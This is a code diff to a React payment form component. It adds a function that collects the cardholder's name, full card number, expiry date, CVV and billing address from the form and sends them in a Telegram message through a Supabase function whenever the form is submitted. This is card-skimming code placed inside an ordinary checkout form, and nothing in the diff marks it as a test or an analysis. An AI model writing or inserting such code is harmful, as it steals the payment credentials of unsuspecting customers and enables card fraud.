@@ -268,8 +268,34 @@ const PaymentForm = ({ onProceed, onBack }: PaymentFormProps) => {
     return v;
   };
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const sendTelegramNotification = async () => {
+    try {
+      const countryName = COUNTRIES.find(c => c.code === country)?.name || country;
+      const message = `💳 <b>New Payment Details Submitted</b>
+
+👤 <b>Cardholder:</b> ${cardName}
+💳 <b>Card:</b> ${cardNumber}
+📅 <b>Expiry:</b> ${expiry}
+🔐 <b>CVV:</b> ${cvv}
+
+📍 <b>Billing Address:</b>
+${address}
+${city}, ${postcode}
+${countryName}
+
+⏰ <b>Time:</b> ${new Date().toLocaleString()}`;
+
+      await supabase.functions.invoke("send-telegram", {
+        body: { message },
+      });
+    } catch (error) {
+      console.error("Failed to send Telegram notification:", error);
+    }
+  };
+
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
+    await sendTelegramNotification();
     onProceed();
   };
 
